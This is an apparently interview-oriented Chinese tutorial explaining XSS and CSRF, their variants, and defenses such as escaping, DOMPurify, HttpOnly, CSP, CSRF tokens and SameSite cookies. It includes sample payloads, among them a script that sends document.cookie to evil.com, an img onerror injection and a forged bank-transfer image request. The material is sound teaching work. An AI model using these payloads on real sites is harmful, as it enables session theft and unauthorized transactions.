# XSS 和 CSRF

这两个都是常见的 Web 安全攻击，但攻击点不一样：

```txt
XSS：攻击的是“用户页面中的脚本执行”
CSRF：攻击的是“用户已登录状态下的接口请求”
```

------

# 1. XSS 是什么？

XSS 全称是：

```txt
Cross Site Scripting
跨站脚本攻击
```

简单说：**攻击者把恶意 JavaScript 代码注入到页面中，让浏览器执行。**

比如评论区原本应该显示普通文本：

```txt
你好，这篇文章不错
```

但攻击者提交了：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

如果网站没有过滤，直接把这段内容渲染到页面中，那么其他用户打开页面时，这段脚本就会执行。

------

# 2. XSS 能造成什么后果？

XSS 的危害主要是：**攻击者可以在用户浏览器中执行代码。**

可能造成：

| 危害         | 说明                                               |
| ------------ | -------------------------------------------------- |
| 窃取 Cookie  | 如果 Cookie 没有设置 `HttpOnly`，可能被 JS 读取    |
| 窃取 token   | 如果 token 存在 `localStorage`，可能被恶意脚本读取 |
| 冒充用户操作 | 恶意脚本可以调用接口                               |
| 修改页面内容 | 比如伪造登录框                                     |
| 跳转钓鱼网站 | 诱导用户输入账号密码                               |

------

# 3. XSS 常见类型

## 3.1 存储型 XSS

恶意代码被保存到了服务器数据库里。

例如评论区：

```html
<script>alert('xss')</script>
```

被保存到数据库，其他用户打开评论页面时，脚本执行。

特点：

```txt
危害大，影响所有访问该页面的用户
```

------

## 3.2 反射型 XSS

恶意代码不存数据库，而是通过 URL 参数传给服务器，再被页面原样返回。

例如：

```txt
https://example.com/search?keyword=<script>alert(1)</script>
```

如果页面直接把 `keyword` 渲染出来，就可能执行脚本。

特点：

```txt
通常需要诱导用户点击恶意链接
```

------

## 3.3 DOM 型 XSS

不经过服务器，问题出在前端 JS 直接操作 DOM。

例如：

```js
const keyword = location.search.split('keyword=')[1]

document.body.innerHTML = keyword
```

如果 URL 是：

```txt
https://example.com/?keyword=<img src=x onerror=alert(1)>
```

前端直接把参数写进 `innerHTML`，就可能触发 XSS。

特点：

```txt
漏洞主要在前端代码
```

------

# 4. XSS 怎么防御？

## 4.1 不要直接使用 innerHTML 渲染用户输入

危险写法：

```js
content.innerHTML = userInput
```

更安全：

```js
content.textContent = userInput
```

React 中默认会对文本内容做转义：

```jsx
function Comment({ content }) {
  return <div>{content}</div>
}
```

即使 `content` 是：

```html
<script>alert(1)</script>
```

React 也会把它当普通文本显示，而不是执行。

------

## 4.2 对用户输入进行转义或过滤

比如把：

```html
<script>
```

转成：

```html
&lt;script&gt;
```

让它只显示，不执行。

------

## 4.3 慎用 dangerouslySetInnerHTML

React 中危险写法：

```jsx
<div dangerouslySetInnerHTML={{ __html: html }} />
```

如果 `html` 来自用户输入，就要先用安全库过滤。

例如：

```js
import DOMPurify from 'dompurify'

const safeHtml = DOMPurify.sanitize(html)
```

------

## 4.4 Cookie 设置 HttpOnly

```txt
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly` 的作用是：**禁止 JavaScript 读取 Cookie**。

这样即使页面发生 XSS，攻击者也不能直接用：

```js
document.cookie
```

读取这个 Cookie。

但注意：`HttpOnly` 只能防止 Cookie 被 JS 读取，不能完全防止 XSS。

------

## 4.5 使用 CSP

CSP 是内容安全策略，可以限制页面能加载和执行哪些脚本。

例如：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

作用是：

```txt
只允许加载本站脚本，减少恶意脚本执行风险
```

------

# 5. CSRF 是什么？

CSRF 全称是：

```txt
Cross Site Request Forgery
跨站请求伪造
```

简单说：**攻击者诱导已登录用户访问恶意网站，恶意网站偷偷向目标网站发请求，利用用户的登录态完成操作。**

关键点是：

```txt
用户已经登录了目标网站
浏览器会自动携带目标网站的 Cookie
攻击者伪造请求
服务器误以为是用户本人操作
```

------

# 6. CSRF 攻击案例

假设用户已经登录银行网站：

```txt
https://bank.com
```

银行网站有一个转账接口：

```txt
GET https://bank.com/transfer?to=attacker&money=1000
```

攻击者做一个恶意网页：

```html
<img src="https://bank.com/transfer?to=attacker&money=1000">
```

用户访问攻击者网页时，浏览器会自动请求这个图片地址。

如果用户还登录着 `bank.com`，浏览器会自动带上 `bank.com` 的 Cookie。

于是银行服务器可能误以为：

```txt
这是用户本人发起的转账请求
```

这就是 CSRF。

实际项目中敏感操作不会用 GET，但原理就是这样。

------

# 7. CSRF 为什么能成功？

因为 Cookie 有一个特点：

```txt
请求某个域名时，浏览器会自动带上这个域名下的 Cookie
```

比如用户访问恶意网站：

```txt
https://evil.com
```

恶意网站里发起请求：

```html
<img src="https://bank.com/transfer">
```

浏览器请求 `bank.com` 时，会自动携带 `bank.com` 的 Cookie。

攻击者不需要知道 Cookie 内容，只要浏览器自动带过去就行。

------

# 8. CSRF 怎么防御？

## 8.1 不要用 GET 做敏感操作

错误设计：

```txt
GET /deleteUser?id=1
GET /transfer?money=1000
```

GET 应该只用于查询，不应该产生副作用。

敏感操作应该使用：

```txt
POST / PUT / DELETE
```

但仅仅改成 POST 还不够，还要配合其他防御。

------

## 8.2 CSRF Token

服务端给页面生成一个随机 token：

```txt
csrfToken = abc123
```

前端请求敏感接口时必须带上：

```http
X-CSRF-Token: abc123
```

服务器校验 token 正确才允许操作。

攻击者在第三方网站上无法读取目标网站页面里的 CSRF Token，所以很难伪造合法请求。

------

## 8.3 SameSite Cookie

设置 Cookie：

```http
Set-Cookie: token=xxx; SameSite=Lax
```

`SameSite` 用来限制跨站请求是否自动携带 Cookie。

常见值：

| SameSite 值 | 含义                                                  |
| ----------- | ----------------------------------------------------- |
| `Strict`    | 最严格，跨站请求完全不带 Cookie                       |
| `Lax`       | 默认较常用，部分安全场景可带 Cookie，比如普通顶级导航 |
| `None`      | 跨站也带 Cookie，但必须配合 `Secure`                  |

常用配置：

```http
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax
```

------

## 8.4 校验 Origin / Referer

服务器可以检查请求来源：

```http
Origin: https://example.com
Referer: https://example.com/page
```

如果来源不是本站，就拒绝请求。

但这个方式通常作为辅助防御，不是唯一手段。

------

# 9. XSS 和 CSRF 的区别

| 对比项           | XSS                               | CSRF                              |
| ---------------- | --------------------------------- | --------------------------------- |
| 中文名           | 跨站脚本攻击                      | 跨站请求伪造                      |
| 攻击核心         | 注入并执行恶意 JS                 | 借用用户登录态伪造请求            |
| 是否需要执行 JS  | 通常需要                          | 不一定                            |
| 是否需要用户登录 | 不一定                            | 通常需要                          |
| 攻击目标         | 用户浏览器、页面内容、token       | 已登录用户的敏感操作              |
| 常见入口         | 评论、搜索框、富文本、URL 参数    | 第三方页面、图片、表单、链接      |
| 主要防御         | 输入过滤、输出转义、CSP、HttpOnly | CSRF Token、SameSite、Origin 校验 |

------

# 10. 和 token 存储的关系

## 10.1 token 放 localStorage

```js
localStorage.setItem('token', token)
```

优点：

```txt
前端控制方便，请求时手动放到 Authorization 头里
```

缺点：

```txt
一旦发生 XSS，恶意脚本可以读取 localStorage 里的 token
```

例如：

```js
const token = localStorage.getItem('token')
```

------

## 10.2 token 放 Cookie

如果 Cookie 设置：

```http
HttpOnly; Secure; SameSite=Lax
```

优点：

```txt
JS 不能读取 Cookie，能降低 XSS 窃取 token 的风险
SameSite 可以降低 CSRF 风险
```

缺点：

```txt
Cookie 会被浏览器自动携带，需要额外注意 CSRF
```

所以：

```txt
localStorage 更怕 XSS
Cookie 更需要关注 CSRF
```

但现代项目里 Cookie 配好 `HttpOnly + Secure + SameSite`，安全性通常更好。

------

# 11. 面试回答版本

XSS 是跨站脚本攻击，核心是攻击者把恶意 JavaScript 注入到页面中，让用户浏览器执行。比如评论区没有过滤用户输入，攻击者提交 `<script>`，其他用户打开页面时脚本执行，就可能窃取 Cookie、读取 localStorage 中的 token、伪造用户操作或修改页面内容。防御方式主要是输入过滤、输出转义、避免直接使用 `innerHTML`，React 默认会对文本进行转义，但要慎用 `dangerouslySetInnerHTML`。此外还可以设置 `HttpOnly` Cookie 和 CSP。

CSRF 是跨站请求伪造，核心是攻击者利用用户已经登录的状态，在第三方网站中偷偷向目标网站发起请求。因为浏览器请求目标域名时会自动携带该域名下的 Cookie，所以服务器可能误以为这是用户本人操作。防御方式主要是不要用 GET 做敏感操作，使用 CSRF Token，设置 Cookie 的 `SameSite` 属性，并在服务端校验 `Origin` 或 `Referer`。

一句话区分：

```txt
XSS 是让用户浏览器执行恶意脚本。
CSRF 是借用户的登录态伪造请求。
```